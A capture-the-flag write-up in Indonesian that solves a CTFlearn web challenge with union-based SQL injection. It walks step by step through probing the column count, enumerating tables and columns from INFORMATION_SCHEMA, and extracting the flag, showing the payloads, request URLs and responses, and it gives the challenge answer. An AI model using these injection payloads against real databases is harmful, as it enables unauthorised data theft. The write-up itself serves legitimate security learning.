# Inj3ction Time (100 Points)
I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command
# Solved
Diberikan sebuah website yg disuruh untuk mendapatkan flag menggunakan SQLi dengan teknik union, saat saya menginput
```
1 UNION SELECT 1,2,3,4
```
https://web.ctflearn.com/web8/?id=1+UNION+SELECT+1%2C2%2C3%2C4 , Saya menemukan pesan
```
Name: Saranac
Breed: Great Dane
Color: Black
Name: 2
Breed: 1
Color: 3
```
Yang berarti union kita hanya sukup sampai 4, kemudian mari kita raih kumpulan table menggunakan query
```
1 union select 1,TABLE_NAME,3,4 from INFORMATION_SCHEMA.TABLES
```
https://web.ctflearn.com/web8/?id=1+union+select+1%2CTABLE_NAME%2C3%2C4+from+INFORMATION_SCHEMA.TABLES , Saya menemukan table nya yaiut
```
Name: w0w_y0u_f0und_m3
```
Kemudian saya mencari column dari tabel tersebut menggunakan query
```
1 union select 1,TABLE_NAME,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS
```
https://web.ctflearn.com/web8/?id=1+union+select+1%2CTABLE_NAME%2CCOLUMN_NAME%2C4+from+INFORMATION_SCHEMA.COLUMNS, Dan saya menemukan pesan
```
Name: w0w_y0u_f0und_m3
Breed: 1
Color: f0und_m3
```
Kita tau bahwa column yang tersedia ialah <b>f0und_m3</b>, kemudian saya mencoba untuk mengambil datanya
```
1 union select 1,f0und_m3,3,4 from w0w_y0u_f0und_m3
```
https://web.ctflearn.com/web8/?id=1+union+select+1%2Cf0und_m3%2C3%2C4+from+w0w_y0u_f0und_m3 , Disini saya mendapatkan flagnya
```
Name: Saranac
Breed: Great Dane
Color: Black
Name: abctf{uni0n_1s_4_gr34t_c0mm4nd}
Breed: 1
Color: 3
```
Flag : <b>abctf{uni0n_1s_4_gr34t_c0mm4nd}</b>